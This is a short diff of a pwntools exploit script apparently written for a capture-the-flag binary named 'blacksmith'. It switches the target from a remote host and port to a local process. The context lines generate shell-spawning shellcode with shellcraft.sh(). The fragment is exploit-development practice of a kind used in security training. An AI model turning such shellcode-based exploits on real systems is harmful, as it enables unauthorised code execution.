@@ -4,9 +4,9 @@ elf = ELF("./blacksmith")
 
 context.binary = elf
 
-#io = elf.process()
+io = elf.process()
 
-io = remote("94.237.52.65", 48318)
+#io = remote("94.237.52.65", 48318)
 
 shellcode = shellcraft.sh()
 
